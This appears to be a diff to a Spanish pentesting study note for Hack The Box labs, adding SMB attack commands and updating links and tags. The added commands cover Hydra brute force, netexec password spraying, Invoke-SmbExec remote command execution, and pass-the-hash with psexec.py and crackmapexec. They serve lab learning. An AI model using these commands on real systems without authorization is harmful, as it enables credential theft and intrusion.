@@ -26,6 +26,19 @@ enum4linux <IP>
 
 # Password spraying
 netexec smb <IP> -u usuarios.txt -p 'admin' --continue-on-success
+
+# Fuerza bruta SMB con Hydra (BLOQUE 5)
+hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt <IP> smb
+
+# Enumeración de carpetas desde Windows (PowerShell)
+net view \\<IP> /all
+dir \\<IP>\<recurso>
+```
+
+### Exfiltración con Invoke-SmbExec (BLOQUE 5)
+
+```powershell
+Invoke-SmbExec -Target <IP> -Username <usuario> -Password <password> -Command "type C:\Users\Administrator\Desktop\proof.txt"
 ```
 
 > [!tip] CONTEXTO
@@ -114,6 +127,15 @@ evil-winrm -i IP -u administrator -p 'CONTRASEÑA'
 | `secretsdump.py` | Vuelca hashes del dominio |
 | `mssqlclient.py` | Cliente MSSQL |
 
+### Pass-the-Hash (BLOQUE 5)
+
+Con **PsExec** o **CrackMapExec** se autentica usando directamente el hash NTLM, sin necesidad de crackear la contraseña:
+
+```bash
+psexec.py <usuario>@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<hash_lm>:<hash_nt>
+crackmapexec smb <IP> -u <usuario> -H <hash_ntlm>
+```
+
 ---
 
 ## Checklist de repaso
@@ -124,6 +146,8 @@ evil-winrm -i IP -u administrator -p 'CONTRASEÑA'
 - [ ] ¿Entiendo la diferencia entre PowerShell y CMD para transferir archivos?
 - [ ] ¿Sé interpretar el informe de WinPEAS?
 - [ ] ¿Puedo escalar con [[SMB_Impacket|psexec.py]] o evil-winrm?
+- [ ] ¿Sé hacer fuerza bruta/spraying SMB con Hydra o netexec?
+- [ ] ¿Entiendo Pass-the-Hash y sé usar `-hashes` / `crackmapexec -H`?
 
 ---
 
@@ -138,23 +162,23 @@ evil-winrm -i IP -u administrator -p 'CONTRASEÑA'
 
 
 
+
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[Escalada de Privilegios.md|Escalada de Privilegios]] — Linux, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[../comandos/Netcat.md|Netcat]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Joselu/MODULO3/resumen_master_clase34.md|resumen_master_clase34]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
+- [[../../apuntes Andres/15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows.md|15.06.2026 Repaso Semanal II Archetype Completa, SMB y Primera Máquina Windows]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[Reverse Shells y Post-Explotación.md|Reverse Shells y Post-Explotación]] — Hack The Box, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../apuntes Chema/Introducción a Consolas - Bash y PowerShell.md|Introducción a Consolas - Bash y PowerShell]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/SMB_Impacket|SMB / Impacket]]
+- [[../../../programacion/XML/xpath_xslt.md|xpath_xslt]] — Programacion: Linux, Python, Redes
+- [[../../../programacion/Go/testing_go.md|testing_go]] — Programacion: Linux, Redes, SQL
 
-> #escalada-privilegios #hack-the-box #linux #metasploit #netcat #pentest #post-explotacion #redes #reverse-shell #smb-impacket #vulnhub #windows
+> #cli #escalada_privilegios #go #hack_the_box #linux #linux_ciber #metasploit #netcat #pentest #post_explotacion #python #redes #redes_ciber #reverse_shell #smb_impacket #sql #vulnhub #windows_ciber
